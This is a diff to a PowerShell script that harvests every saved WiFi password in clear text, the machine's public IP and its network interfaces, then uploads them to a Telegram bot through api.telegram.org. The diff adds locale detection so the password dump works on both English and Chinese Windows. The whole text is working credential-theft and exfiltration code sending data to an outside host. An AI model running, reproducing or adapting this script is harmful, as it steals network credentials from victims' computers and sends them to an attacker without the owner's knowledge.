@@ -7,6 +7,7 @@ $PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
 $token = "YOUR_BOT_TOKEN_FOR_TELEGRAM"
 $url = "https://api.telegram.org/bot$token"
 $outpath = "$env:TEMP/netinfo.txt"
+$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -23,15 +24,32 @@ $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
 Function Post-Message{$script:params = @{chat_id = $chatID ;text = $contents};Invoke-WebRequest -Uri ($url + "/sendMessage") -Method POST -Body $params | Out-Null}
 Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO.File]::ReadAllBytes($outpath);$fileEncoding = [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);$boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n";$bodyLines = ( "--$boundary","Content-Disposition: form-data; name=`"chat_id`"$LF","$chatID$LF","--$boundary","Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"","Content-Type: application/octet-stream$LF","$fileEncoding","--$boundary--$LF" ) -join $LF;Invoke-WebRequest -Uri ($url + "/sendDocument") -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null}
 
-$contents = "$comp Gathering System Network Information for $env:COMPUTERNAME $comp"
+$contents = "$comp Gathering Network Information for $env:COMPUTERNAME $comp"
 Post-Message
 
-"All WiFi Tokens:`n" | Out-File -FilePath $outpath -Append
-netsh wlan show profile | Select-String '(?<=所有用户配置文件\s+:\s).+' | ForEach-Object {
-    $ssid = [string]$_.Matches.Value
-    $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=关键内容\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
-    Write-Output ("SSID: $ssid | PSK: $psk")
-} | Out-File -FilePath $outpath -Append
+$PublicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+"Public IP Address: $PublicIP`n" | Out-File -FilePath $outpath -Append
+
+"`nAll WiFi Tokens:`n" | Out-File -FilePath $outpath -Append
+if ($systemLanguage -eq "en-US") {
+    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+        $ssid = [string]$_.Matches.Value
+        $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=Key Content\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
+        if([String]::IsNullOrEmpty($psk)){$psk = "None"}
+        Write-Output ("SSID: $ssid | PSK: $psk")
+    } | Out-File -FilePath $outpath -Append
+}
+elseif ($systemLanguage -eq "zh-CN") {
+    netsh wlan show profile | Select-String '(?<=所有用户配置文件\s+:\s).+' | ForEach-Object {
+        $ssid = [string]$_.Matches.Value
+        $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=关键内容\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
+        if([String]::IsNullOrEmpty($psk)){$psk = "None"}
+        Write-Output ("SSID: $ssid | PSK: $psk")
+    } | Out-File -FilePath $outpath -Append
+}
+else {
+    "Not supported system" | Out-File -FilePath $outpath -Append
+}
 
 "`nAll Network Interfaces:" | Out-File -FilePath $outpath -Append
 Get-NetIPInterface | Out-File -FilePath $outpath -Append
